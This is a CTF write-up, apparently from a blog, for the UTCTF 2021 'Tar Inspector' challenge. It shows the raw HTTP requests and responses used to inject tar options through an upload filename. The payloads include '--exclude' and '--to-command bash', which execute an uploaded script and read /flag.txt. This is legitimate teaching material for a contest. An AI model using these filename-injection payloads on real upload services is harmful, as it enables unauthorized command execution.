---
layout: post
title:  "Tar Inspector"
tags: ctf
author: f02a8dfe
---
My friend linked me this cool site. He said it's super secure so there's no way you could blindly break in.
UTCTF, 13th March 2021

author mattyp provided a link to a file upload form:

{% highlight html %}
<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector!</h1>
      <p>Do you ever have a tar archive, and you want to know what's inside without actually un-tar-ing it?</p>
      <p>Well, now you can with FREE Tar Inspector ®! Just upload a tar and hit submit!</p>
      <form action="/upload" method="POST"
         enctype="multipart/form-data">
         <input type="file" name="file" />
         <input type="submit"/>
      </form>
    </div>
    <div>
    </div>
  </body>
</html>
{% endhighlight %}

`/upload` accepted tar files:

{% highlight http %}
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------54694391230115235351812949109
Content-Length: 10470
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------54694391230115235351812949109
Content-Disposition: form-data; name="file"; filename="test09876.tar"
Content-Type: application/x-tar

././@PaxHeader.........................................................
.............................0000000.0000000.0000000.00000000030.00000000000.010206. x...........................................................................
.........................ustar.
-----------------------------54694391230115235351812949109--
{% endhighlight %}

and returned a `Filename` with a list of contents:

{% highlight http %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 440
Server: Werkzeug/1.0.1 Python/3.6.9

<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector</h1>
      <p>Here is the directory structure of your tar!</p>
      
      <p>Filename: test09876__672aa4.tar</p>
        <p style="color:gray;text-align:left">
        
          └─ test.txt<br>
        
          <br>
        
        </p>
      
    </div>
  </body>
</html>
{% endhighlight %}

it was possible to inject command line options through the filename parameter:

{% highlight http %}
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------106726511336759518402985776037
Content-Length: 239
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------106726511336759518402985776037
Content-Disposition: form-data; name="file"; filename=" --version .tar"
Content-Type: application/octet-stream


-----------------------------106726511336759518402985776037--
{% endhighlight %}

`--version` output:

{% highlight http %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1087
Server: Werkzeug/1.0.1 Python/3.6.9

<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector</h1>
      <p>Here is the directory structure of your tar!</p>
      
      <p>Filename:  --version __31490d.tar</p>
        <p style="color:gray;text-align:left">
        
          ├─ tar (GNU tar) 1.29<br>
        
          ├─ Copyright (C) 2015 Free Software Foundation, Inc.<br>
        
          ├─ License GPLv3+: GNU GPL version 3 or later &lt;http:<br>
        
          │  └─ <br>
        
          │    └─ gnu.org<br>
        
          │      └─ licenses<br>
        
          │        └─ gpl.html&gt;.<br>
        
          ├─ This is free software: you are free to change and redistribute it.<br>
        
          ├─ There is NO WARRANTY, to the extent permitted by law.<br>
        
          ├─ <br>
        
          └─ Written by John Gilmore and Jay Fenlason.<br>
        
          <br>
        
        </p>
      
    </div>
  </body>
</html>
{% endhighlight %}

and retrieve files with `Filename` and `--exclude`:

{% highlight http %}
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------95586852121031516363569830765
Content-Length: 260
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------95586852121031516363569830765
Content-Disposition: form-data; name="file"; filename="test09876__672aa4.tar --exclude .tar"
Content-Type: application/octet-stream


-----------------------------95586852121031516363569830765--
{% endhighlight %}

to process previously submitted tar files: 

{% highlight http %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 463
Server: Werkzeug/1.0.1 Python/3.6.9

<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector</h1>
      <p>Here is the directory structure of your tar!</p>
      
      <p>Filename: test09876__672aa4.tar --exclude __37aa80.tar</p>
        <p style="color:gray;text-align:left">
        
          └─ test.txt<br>
        
          <br>
        
        </p>
      
    </div>
  </body>
</html>
{% endhighlight %}

by placing a text file with bash commands inside the tar:

{% highlight bash %}
$ cat test.txt           
cat /flag.txt
$ tar -cvf test.tar test.txt
test.txt
{% endhighlight %}

uploading it and retrieving the `Filename` value:

{% highlight http %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 469
Server: Werkzeug/1.0.1 Python/3.6.9

<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector</h1>
      <p>Here is the directory structure of your tar!</p>
      
      <p>Filename: test__3f5902.tar</p>
        <p style="color:gray;text-align:left">
        
          └─ .<br>
        
            └─ test.txt<br>
        
          <br>
        
        </p>
      
    </div>
  </body>
</html>
{% endhighlight %}

it was possible to pipe the contents of the text file to bash with `--to-command bash`:

{% highlight http %}
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------107249988435935283743027355616
Content-Length: 275
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------107249988435935283743027355616
Content-Disposition: form-data; name="file"; filename="test__3f5902.tar --to-command bash --exclude .tar"
Content-Type: application/octet-stream


-----------------------------107249988435935283743027355616--
{% endhighlight %}

which returned the flag:

{% highlight http %}
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 586
Server: Werkzeug/1.0.1 Python/3.6.9

<html>
  <head> <link rel="stylesheet" href="/static/styles.css">
    <title>FREE Tar Insepector</title>
  </head>
  <body>
    <div>
      <h1>Tar Inspector</h1>
      <p>Here is the directory structure of your tar!</p>
      
      <p>Filename: test__3f5902.tar --to-command bash --exclude __6648bb.tar</p>
        <p style="color:gray;text-align:left">
        
          ├─ .<br>
        
          │  └─ test.txt<br>
        
          └─ utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}<br>
        
          <br>
        
        </p>
      
    </div>
  </body>
</html>
{% endhighlight %}
